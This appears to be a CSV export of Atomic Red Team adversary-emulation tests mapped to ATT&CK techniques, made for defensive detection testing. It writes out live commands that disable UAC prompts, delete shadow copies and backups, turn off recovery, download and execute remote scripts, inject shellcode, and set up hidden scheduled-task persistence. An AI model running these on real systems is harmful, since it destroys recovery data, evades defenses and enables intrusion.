T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,Disable ConsentPromptBehaviorAdmin via registry keys,a768aaa2-2442-475c-8990-69cf33af0f4e,"This atomic regarding setting ConsentPromptBehaviorAdmin to 0 configures the UAC so that it does not prompt for consent or credentials when actions requiring elevated privileges are performed by users in the administrators group. This means that any operation that would normally trigger a UAC prompt will proceed automatically without user interaction.
",windows,,,"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
",command_prompt,,,"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 5 /f
",,,
T1615,Group Policy Discovery,Display group policy information via gpresult,0976990f-53b1-4d3f-a185-6df5be429d3b,"Uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information for a remote user and computer
The /z parameter displays all available information about Group Policy. More parameters can be found in the linked Microsoft documentation
https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult
https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/
Turla has used the /z and /v parameters: https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf
",windows,,,"gpresult /z
",command_prompt,False,,,,,
T1615,Group Policy Discovery,Get-DomainGPO to display group policy information via PowerView,4e524c4e-0e02-49aa-8df5-93f3f7959b9f,Use PowerView to Get-DomainGPO This will only work on Windows 10 Enterprise and A DC Windows 2019.,windows,,,"powershell -nop -exec bypass -c ""IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO""",powershell,True,,,,,
T1615,Group Policy Discovery,WinPwn - GPOAudit,bc25c04b-841e-4965-855f-d1f645d7ab73,Check domain Group policies for common misconfigurations using Grouper2 via GPOAudit function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
GPOAudit -noninteractive -consoleoutput",powershell,,,,,,
T1615,Group Policy Discovery,WinPwn - GPORemoteAccessPolicy,7230d01a-0a72-4bd5-9d7f-c6d472bc6a59,Enumerate remote access policies through group policy using GPORemoteAccessPolicy function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
GPORemoteAccessPolicy -consoleoutput -noninteractive",powershell,,,,,,
T1615,Group Policy Discovery,MSFT Get-GPO Cmdlet,52778a8f-a10b-41a4-9eae-52ddb74072bf,The Get-GPO cmdlet gets one Group Policy Object (GPO) or all the GPOs in a domain. Tested on Windows Server 2019 as a domain user with computer joined to domain. Reference: https://docs.microsoft.com/en-us/powershell/module/grouppolicy/get-gpo?view=windowsserver2022-ps,windows,,,Get-GPO -Domain $ENV:userdnsdomain #{gpo_param} >> #{gpo_output},powershell,True,,del $env:temp\GPO_Output.txt -erroraction silentlycontinue,powershell,"dependencies.0.description: Add Rsat.ActiveDirectory.DS
dependencies.0.prereq_command: if(Get-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0 | Where-Object { $_.State -eq 'Installed' }){ exit 0 } else { exit 1 }
dependencies.0.get_prereq_command: Add-WindowsCapability -online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0
dependencies.1.description: Add Rsat.GroupPolicy.Management.Tools ###Two RSAT Modules needed for this to work on Win10, WinServer 2019 works by default. This will take a long time (almost 2 minutes) to install RSAT Manually###.
dependencies.1.prereq_command: if(Get-WindowsCapability -Online -Name Rsat.GroupPolicy.Management.Tools~~~~0.0.1.0 | Where-Object { $_.State -eq 'Installed' }){ exit 0 } else { exit 1 }
dependencies.1.get_prereq_command: Add-WindowsCapability -online -Name Rsat.GroupPolicy.Management.Tools~~~~0.0.1.0
","input_arguments.gpo_output.description: The output of the Get-GPO cmdlet

input_arguments.gpo_output.type: string

input_arguments.gpo_output.default: $env:temp\GPO_Output.txt

input_arguments.gpo_param.description: You can specify a GPO by its display name or by its globally unique identifier (GUID) to get a single GPO, or you can get all the GPOs in the domain through the All parameter

input_arguments.gpo_param.type: string

input_arguments.gpo_param.default: -All

"
T1490,Inhibit System Recovery,Windows - Delete Volume Shadow Copies,43819286-91a9-4369-90ed-d31fb4da2c01,"Deletes Windows Volume Shadow Copies. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon
execution, if no shadow volumes exist the message ""No items found that satisfy the query."" will be displayed. If shadow volumes are present, it
will delete them without printing output to the screen. This is because the /quiet parameter was passed which also suppresses the y/n
confirmation prompt. Shadow copies can only be created on Windows server or Windows 8.

https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc788055(v=ws.11)
",windows,,,"vssadmin.exe delete shadows /all /quiet
",command_prompt,True,,,powershell,"dependencies.0.description: Create volume shadow copy of C:\ . This prereq command only works on Windows Server or Windows 8.

dependencies.0.prereq_command: if(!(vssadmin.exe list shadows | findstr ""No items found that satisfy the query."")) { exit 0 } else { exit 1 }

dependencies.0.get_prereq_command: vssadmin.exe create shadow /for=c:

",
T1490,Inhibit System Recovery,Windows - Delete Volume Shadow Copies via WMI,6a3ff8dd-f49c-4272-a658-11c2fe58bd88,"Deletes Windows Volume Shadow Copies via WMI. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.
Shadow copies can only be created on Windows server or Windows 8.
",windows,,,"wmic.exe shadowcopy delete
",command_prompt,True,,,,,
T1490,Inhibit System Recovery,Windows - wbadmin Delete Windows Backup Catalog,263ba6cb-ea2b-41c9-9d4e-b652dadd002c,"Deletes Windows Backup Catalog. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon execution,
""The backup catalog has been successfully deleted."" will be displayed in the PowerShell session.
",windows,,,"wbadmin delete catalog -quiet
",command_prompt,True,,,,,
T1490,Inhibit System Recovery,Windows - Disable Windows Recovery Console Repair,cf21060a-80b3-4238-a595-22525de4ab81,"Disables repair by the Windows Recovery Console on boot. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.
Upon execution, ""The operation completed successfully."" will be displayed in the powershell session.
",windows,,,"bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
bcdedit.exe /set {default} recoveryenabled no
",command_prompt,True,,"bcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures >nul 2>&1
bcdedit.exe /set {default} recoveryenabled yes >nul 2>&1
",,,
T1490,Inhibit System Recovery,Windows - Delete Volume Shadow Copies via WMI with PowerShell,39a295ca-7059-4a88-86f6-09556c1211e7,"Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject.
This technique is used by numerous ransomware families such as Sodinokibi/REvil.
Executes Get-WMIObject. Shadow copies can only be created on Windows server or Windows 8, so upon execution
there may be no output displayed.
",windows,,,"Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
",powershell,True,,,,,
T1490,Inhibit System Recovery,Windows - Delete Backup Files,6b1dbaf6-cc8a-4ea6-891f-6058569653bf,"Deletes backup files in a manner similar to Ryuk ransomware. Upon exection, many ""access is denied"" messages will appear as the commands try
to delete files from around the system.
",windows,,,"del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
",command_prompt,True,,,,,
T1490,Inhibit System Recovery,Windows - wbadmin Delete systemstatebackup,584331dd-75bc-4c02-9e0b-17f5fd81c748,"Deletes the Windows systemstatebackup using wbadmin.exe. This technique is used by numerous ransomware families. This may only be successful on server platforms that have Windows Backup enabled.
",windows,,,"wbadmin delete systemstatebackup -keepVersions:0
",command_prompt,True,,,,,
T1490,Inhibit System Recovery,Windows - Disable the SR scheduled task,1c68c68d-83a4-4981-974e-8993055fa034,"Use schtasks.exe to disable the System Restore (SR) scheduled task
",windows,,,"schtasks.exe /Change /TN ""\Microsoft\Windows\SystemRestore\SR"" /disable
",command_prompt,True,,"schtasks.exe /Change /TN ""\Microsoft\Windows\SystemRestore\SR"" /enable >nul 2>&1
",,,
T1490,Inhibit System Recovery,Disable System Restore Through Registry,66e647d1-8741-4e43-b7c1-334760c2047f,"Modify the registry of the currently logged in user using reg.exe via cmd console to disable system restore on the computer. 
See how remcos RAT abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details
",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore"" /v ""DisableConfig"" /t ""REG_DWORD"" /d ""1"" /f
reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore"" /v ""DisableSR"" /t ""REG_DWORD"" /d ""1"" /f
reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"" /v ""DisableConfig"" /t ""REG_DWORD"" /d ""1"" /f
reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"" /v ""DisableSR"" /t ""REG_DWORD"" /d ""1"" /f
",command_prompt,True,,"reg delete ""HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore"" /v ""DisableConfig"" /f >nul 2>&1
reg delete ""HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore"" /v ""DisableSR"" /f >nul 2>&1
reg delete ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"" /v ""DisableConfig"" /f >nul 2>&1
reg delete ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"" /v ""DisableSR"" /f >nul 2>&1
",,,
T1490,Inhibit System Recovery,Windows - vssadmin Resize Shadowstorage Volume,da558b07-69ae-41b9-b9d4-4d98154a7049,Adversaries generally try to Resize Shadowstorage Volume using vssadmin.exe to avoid the shadow volumes being made again. This technique is typically found used by adversaries during a ransomware event and a precursor to deleting the shadowstorage.,windows,,,vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%,powershell,True,,,,,
T1030,Data Transfer Size Limits,Data Transfer Size Limits,ab936c51-10f4-46ce-9144-e02137b2016a,"Take a file/directory, split it into 5Mb chunks
",macos,linux,,"cd #{folder_path}; split -b 5000000 #{file_name}
ls -l #{folder_path}
",sh,,,"if [ -f #{folder_path}/safe_to_delete ]; then rm -rf #{folder_path}; fi;
",sh,"dependencies.0.description: The file must exist for the test to run.
dependencies.0.prereq_command: if [ ! -f #{folder_path}/#{file_name} ]; then exit 1; else exit 0; fi;

dependencies.0.get_prereq_command: if [ ! -d #{folder_path} ]; then mkdir -p #{folder_path}; touch #{folder_path}/safe_to_delete; fi; dd if=/dev/urandom of=#{folder_path}/#{file_name} bs=25000000 count=1

","input_arguments.file_name.description: File name

input_arguments.file_name.type: path

input_arguments.file_name.default: T1030_urandom

input_arguments.folder_path.description: Path where the test creates artifacts

input_arguments.folder_path.type: path

input_arguments.folder_path.default: /tmp/T1030

"
T1218.008,Signed Binary Proxy Execution: Odbcconf,Odbcconf.exe - Execute Arbitrary DLL,2430498b-06c0-4b92-a448-8ad263c388e2,"Execute arbitrary DLL file stored locally.
",windows,,,"odbcconf.exe /S /A {REGSVR ""#{dll_payload}""}
",command_prompt,,,,powershell,"dependencies.0.description: T1218-2.dll must exist on disk at specified location (#{dll_payload})

dependencies.0.prereq_command: if (Test-Path ""#{dll_payload}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{dll_payload}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/src/Win32/T1218-2.dll"" -OutFile ""#{dll_payload}""

","input_arguments.dll_payload.description: DLL to execute

input_arguments.dll_payload.type: path

input_arguments.dll_payload.default: PathToAtomicsFolder\T1218.008\src\Win32\T1218-2.dll

"
T1218.008,Signed Binary Proxy Execution: Odbcconf,Odbcconf.exe - Load Response File,331ce274-f9c9-440b-9f8c-a1006e1fce0b,"Execute arbitrary response file that will spawn PowerShell.exe.
Source files: https://github.com/woanware/application-restriction-bypasses
",windows,,,"cd ""#{rsp_file_path}""
odbcconf.exe -f ""#{rsp_file_name}""
",command_prompt,,,,powershell,"dependencies.0.description: T1218.008.rsp must exist on disk at specified location (#{rsp_file_path}#{rsp_file_name})

dependencies.0.prereq_command: if (Test-Path ""#{rsp_file_path}#{rsp_file_name}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/bin/T1218.008.rsp"" -OutFile ""#{rsp_file_path}#{rsp_file_name}""
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/bin/o.dll"" -OutFile ""#{rsp_file_path}\o.dll""

","input_arguments.rsp_file_name.description: Response file name to load

input_arguments.rsp_file_name.type: string

input_arguments.rsp_file_name.default: T1218.008.rsp

input_arguments.rsp_file_path.description: Response file path

input_arguments.rsp_file_path.type: string

input_arguments.rsp_file_path.default: PathToAtomicsFolder\T1218.008\bin\

"
T1070,Indicator Removal on Host,Indicator Removal using FSUtil,b4115c7a-0e92-47f0-a61e-17e7218b2435,"Manages the update sequence number (USN) change journal, which provides a persistent log of all changes made to files on the volume. Upon execution, no output
will be displayed. More information about fsutil can be found at https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-usn
",windows,,,"fsutil usn deletejournal /D C:
",command_prompt,True,,"fsutil usn createjournal m=1000 a=100 c:
",,,
T1070,Indicator Removal on Host,Indicator Manipulation using FSUtil,96e86706-6afd-45b6-95d6-108d23eaf2e9,"Finds a file by user name (if Disk Quotas are enabled), queries allocated ranges for a file, sets a file's short name, sets a file's valid data length, sets zero data for a file, or creates a new file. Upon execution, no output
will be displayed. More information about fsutil can be found at https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-file
- https://tria.ge/230601-x8x6bsgb24/behavioral2
",windows,,,"if (-not (Test-Path ""#{file_to_manipulate}"")) { New-Item ""#{file_to_manipulate}"" -Force } 
echo ""1234567890"" > ""#{file_to_manipulate}""
fsutil  file setZeroData offset=0 length=#{file_data_length} ""#{file_to_manipulate}""
",powershell,False,,"rm ""#{file_to_manipulate}""
",,,"input_arguments.file_to_manipulate.description: Path of file to manipulate

input_arguments.file_to_manipulate.type: path

input_arguments.file_to_manipulate.default: PathToAtomicsFolder\..\ExternalPayloads\T1070-2.txt

input_arguments.file_data_length.description: Data length to setzero

input_arguments.file_data_length.type: integer

input_arguments.file_data_length.default: 10

"
T1021.004,Remote Services: SSH,ESXi - Enable SSH via PowerCLI,8f6c14d1-f13d-4616-b7fc-98cc69fe56ec,"An adversary enables the SSH service on a ESXi host to maintain persistent access to the host and to carryout subsequent operations.
",linux,,,"Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false 
Connect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}
Get-VMHostService -VMHost #{vm_host} | Where-Object {$_.Key -eq ""TSM-SSH"" } | Start-VMHostService -Confirm:$false
",powershell,True,,"Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false 
Connect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}
Get-VMHostService -VMHost #{vm_host} | Where-Object {$_.Key -eq ""TSM-SSH"" } | Stop-VMHostService -Confirm:$false
",powershell,"dependencies.0.description: Check if VMWARE PowerCLI PowerShell Module is installed.

dependencies.0.prereq_command: $RequiredModule = Get-Module -Name VMware.PowerCLI -ListAvailable
if (-not $RequiredModule) {exit 1}

dependencies.0.get_prereq_command: Install-Module -Name VMware.PowerCLI

","input_arguments.vm_host.description: Specify the host name of the ESXi Server

input_arguments.vm_host.type: string

input_arguments.vm_host.default: atomic.local

input_arguments.vm_user.description: Specify the privilege user account on ESXi Server

input_arguments.vm_user.type: string

input_arguments.vm_user.default: root

input_arguments.vm_pass.description: Specify the privilege user password on ESXi Server

input_arguments.vm_pass.type: string

input_arguments.vm_pass.default: pass

"
T1055.015,Process Injection: ListPlanting,Process injection ListPlanting,4f3c7502-b111-4dfe-8a6e-529307891a59,"This test injects shellcode into a remote RegEdit process using the ListPlanting technique. ListPlanting exploits Window with ListView control. Code write to memory with NtWriteVirtualMemory. The shellcode is executed via PostMessage. When successful, a message box will appear with the title ""Warning"" and the content ""Atomic Red Team"" after a few seconds. Notepad will open following the appearance of the message box.",windows,,,"Start-Process ""#{exe_binary}""
Start-Sleep -Seconds 7
Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",powershell,True,,Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force,powershell,"dependencies.0.description: Injector ListPlanting.exe must exist at specified location (#{exe_binary})

dependencies.0.prereq_command: if (Test-Path ""#{exe_binary}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{exe_binary}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.015/bin/ListPlanting.exe"" -OutFile ""#{exe_binary}""

","input_arguments.exe_binary.description: PE binary

input_arguments.exe_binary.type: path

input_arguments.exe_binary.default: PathToAtomicsFolder\T1055.015\bin\ListPlanting.exe

"
T1053.005,Scheduled Task/Job: Scheduled Task,Scheduled Task Startup Script,fec27f65-db86-4c2d-b66c-61945aee87c2,"Run an exe on user logon or system startup.  Upon execution, success messages will be displayed for the two scheduled tasks. To view
the tasks, open the Task Scheduler and look in the Active Tasks pane.
",windows,,,"schtasks /create /tn ""T1053_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe""
schtasks /create /tn ""T1053_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""
",command_prompt,True,,"schtasks /delete /tn ""T1053_005_OnLogon"" /f >nul 2>&1
schtasks /delete /tn ""T1053_005_OnStartup"" /f >nul 2>&1
",,,
T1053.005,Scheduled Task/Job: Scheduled Task,Scheduled task Local,42f53695-ad4a-4546-abb6-7d837f644a71,"Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10.
",windows,,,"SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}
",command_prompt,False,,"SCHTASKS /Delete /TN spawn /F >nul 2>&1
",,,"input_arguments.task_command.description: What you want to execute

input_arguments.task_command.type: string

input_arguments.task_command.default: C:\windows\system32\cmd.exe

input_arguments.time.description: What time 24 Hour

input_arguments.time.type: string

input_arguments.time.default: 20:10

"
T1053.005,Scheduled Task/Job: Scheduled Task,Scheduled task Remote,2e5eac3e-327b-4a88-a0c0-c4057039a8dd,"Create a task on a remote system.
Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10 on a remote endpoint.
",windows,,,"SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN ""Atomic task"" /TR ""#{task_command}"" /SC daily /ST #{time}
",command_prompt,True,,"SCHTASKS /Delete /S #{target} /U #{user_name} /P #{password} /TN ""Atomic task"" /F >nul 2>&1
",,,"input_arguments.task_command.description: What you want to execute

input_arguments.task_command.type: string

input_arguments.task_command.default: C:\windows\system32\cmd.exe

input_arguments.time.description: What time 24 Hour

input_arguments.time.type: string

input_arguments.time.default: 20:10

input_arguments.target.description: Target

input_arguments.target.type: string

input_arguments.target.default: localhost

input_arguments.user_name.description: Username to authenticate with, format: DOMAIN\User

input_arguments.user_name.type: string

input_arguments.user_name.default: DOMAIN\user

input_arguments.password.description: Password to authenticate with

input_arguments.password.type: string

input_arguments.password.default: At0micStrong

"
T1053.005,Scheduled Task/Job: Scheduled Task,Powershell Cmdlet Scheduled Task,af9fd58f-c4ac-4bf2-a9ba-224b71ff25fd,"Create an atomic scheduled task that leverages native powershell cmdlets.

Upon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10.
",windows,,,"$Action = New-ScheduledTaskAction -Execute ""calc.exe""
$Trigger = New-ScheduledTaskTrigger -AtLogon
$User = New-ScheduledTaskPrincipal -GroupId ""BUILTIN\Administrators"" -RunLevel Highest
$Set = New-ScheduledTaskSettingsSet
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
Register-ScheduledTask AtomicTask -InputObject $object
",powershell,False,,"Unregister-ScheduledTask -TaskName ""AtomicTask"" -confirm:$false >$null 2>&1
",,,
T1053.005,Scheduled Task/Job: Scheduled Task,Task Scheduler via VBA,ecd3fa21-7792-41a2-8726-2c5c673414d3,"This module utilizes the Windows API to schedule a task for code execution (notepad.exe). The task scheduler will execute ""notepad.exe"" within
30 - 40 seconds after this module has run
",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing) 
Invoke-MalDoc -macroFile ""PathToAtomicsFolder\T1053.005\src\T1053.005-macrocode.txt"" -officeProduct ""#{ms_product}"" -sub ""Scheduler""
",powershell,,,"Unregister-ScheduledTask -TaskName ""Run Notepad"" -Confirm:$false
",powershell,"dependencies.0.description: Microsoft #{ms_product} must be installed

dependencies.0.prereq_command: try {
  New-Object -COMObject ""#{ms_product}.Application"" | Out-Null
  $process = ""#{ms_product}""; if ( $process -eq ""Word"") {$process = ""winword""}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }

dependencies.0.get_prereq_command: Write-Host ""You will need to install Microsoft #{ms_product} manually to meet this requirement""

","input_arguments.ms_product.description: Maldoc application Word

input_arguments.ms_product.type: string

input_arguments.ms_product.default: Word

"
T1053.005,Scheduled Task/Job: Scheduled Task,WMI Invoke-CimMethod Scheduled Task,e16b3b75-dc9e-4cde-a23d-dfa2d0507b3b,"Create an scheduled task that executes notepad.exe after user login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing as Register-ScheduledTask cmdlet behind the scenes.
",windows,,,"$xml = [System.IO.File]::ReadAllText(""#{xml_path}"")
Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace ""Root\Microsoft\Windows\TaskScheduler"" -MethodName ""RegisterByXml"" -Arguments @{ Force = $true; Xml =$xml; }
",powershell,True,,"Unregister-ScheduledTask -TaskName ""T1053_005_WMI"" -confirm:$false >$null 2>&1
",powershell,"dependencies.0.description: File to copy must exist on disk at specified location (#{xml_path})

dependencies.0.prereq_command: if (Test-Path ""#{xml_path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{xml_path}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1053.005/src/T1053_005_WMI.xml"" -OutFile ""#{xml_path}""

","input_arguments.xml_path.description: path of vbs to use when creating masquerading files

input_arguments.xml_path.type: path

input_arguments.xml_path.default: PathToAtomicsFolder\T1053.005\src\T1053_005_WMI.xml

"
T1053.005,Scheduled Task/Job: Scheduled Task,Scheduled Task Executing Base64 Encoded Commands From Registry,e895677d-4f06-49ab-91b6-ae3742d0a2ba,"A Base64 Encoded command will be stored in the registry (ping 127.0.0.1) and then a scheduled task will be created.
The scheduled task will launch powershell to decode and run the command in the registry daily.
This is a persistence mechanism recently seen in use by Qakbot.  

[Additiona Information](https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/)
",windows,,,"reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f
schtasks.exe /Create /F /TN ""ATOMIC-T1053.005"" /TR ""cmd /c start /min \""\"" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))"" /sc daily /st #{time}
",command_prompt,,,"schtasks /delete /tn ""ATOMIC-T1053.005"" /F >nul 2>&1
reg delete HKCU\SOFTWARE\ATOMIC-T1053.005 /F >nul 2>&1
",,,"input_arguments.time.description: Daily scheduled task execution time

input_arguments.time.type: string

input_arguments.time.default: 07:45

"
T1053.005,Scheduled Task/Job: Scheduled Task,Import XML Schedule Task with Hidden Attribute,cd925593-fbb4-486d-8def-16cbdf944bf4,"Create an scheduled task that executes calc.exe after user login from XML that contains hidden setting attribute. 
This technique was seen several times in tricbot malware and also with the targetted attack campaigne the industroyer2.
",windows,,,"$xml = [System.IO.File]::ReadAllText(""#{xml_path}"")
Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace ""Root\Microsoft\Windows\TaskScheduler"" -MethodName ""RegisterByXml"" -Arguments @{ Force = $true; Xml =$xml; }
",powershell,True,,"Unregister-ScheduledTask -TaskName ""atomic red team"" -confirm:$false >$null 2>&1
",powershell,"dependencies.0.description: File to copy must exist on disk at specified location (#{xml_path})

dependencies.0.prereq_command: if (Test-Path ""#{xml_path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{xml_path}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1053.005/src/T1053_05_SCTASK_HIDDEN_ATTRIB.xml"" -OutFile ""#{xml_path}""

","input_arguments.xml_path.description: path of vbs to use when creating masquerading files

input_arguments.xml_path.type: path

input_arguments.xml_path.default: PathToAtomicsFolder\T1053.005\src\T1053_05_SCTASK_HIDDEN_ATTRIB.xml

"
T1053.005,Scheduled Task/Job: Scheduled Task,PowerShell Modify A Scheduled Task,dda6fc7b-c9a6-4c18-b98d-95ec6542af6d,"Create a scheduled task with an action and modify the action to do something else. The initial idea is to showcase Microsoft Windows TaskScheduler Operational log modification of an action on a Task already registered. 
It will first be created to spawn cmd.exe, but modified to run notepad.exe.

Upon successful execution, powershell.exe will create a scheduled task and modify the action. 
",windows,,,"$Action = New-ScheduledTaskAction -Execute ""cmd.exe""
$Trigger = New-ScheduledTaskTrigger -AtLogon
$User = New-ScheduledTaskPrincipal -GroupId ""BUILTIN\Administrators"" -RunLevel Highest
$Set = New-ScheduledTaskSettingsSet
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
Register-ScheduledTask AtomicTaskModifed -InputObject $object
$NewAction = New-ScheduledTaskAction -Execute ""Notepad.exe""
Set-ScheduledTask ""AtomicTaskModifed"" -Action $NewAction
",powershell,False,,"Unregister-ScheduledTask -TaskName ""AtomicTaskModifed"" -confirm:$false >$null 2>&1
",,,
T1053.005,Scheduled Task/Job: Scheduled Task,"Scheduled Task (""Ghost Task"") via Registry Key Manipulation",704333ca-cc12-4bcf-9916-101844881f54,"Create a scheduled task through manipulation of registry keys. This procedure is implemented using the [GhostTask](https://github.com/netero1010/GhostTask) utility. By manipulating registry keys under HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree, the tool creates user-specified scheduled tasks without a corresponding Windows Event 4698, which is logged when scheduled tasks are created through conventional means.
This requires a download of the GhostTask binary, which must be run as NT Authority\SYSTEM. Upon successful execution of this test, a scheduled task will be set to run at logon which launches notepad.exe or runs a user-specified command.
For further exploration of this procedure and guidance for hunting and detection, see [Hunting G-G-G-GhostTasks!](https://medium.com/p/154b50ab6a78).
",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" \\#{target} -accepteula -s ""cmd.exe""
""PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe"" \\#{target} add #{task_name} ""cmd.exe"" ""/c #{task_command}"" #{user_name} logon
",command_prompt,True,,"""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" \\#{target} -accepteula -s ""cmd.exe""
""PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe"" \\#{target} delete #{task_name} > nul",powershell,"dependencies.0.description: PsExec tool from Sysinternals must exist in the ExternalPayloads directory

dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"") { exit 0} else { exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://download.sysinternals.com/files/PSTools.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip""
Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"" ""PathToAtomicsFolder\..\ExternalPayloads\PsTools"" -Force
Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe"" ""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" -Force

dependencies.1.description: GhostTask.exe tool from netero101 must exist in the ExternalPayloads directory. This tool may be quarantined by windows defender; disable windows defender real-time protection to fix it or add the ExternalPayloads directory as an exclusion, using a command like `Add-MpPreference -ExclusionPath ""PathToAtomicsFolder\..\ExternalPayloads\""`

dependencies.1.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe"") { exit 0} else { exit 1}

dependencies.1.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
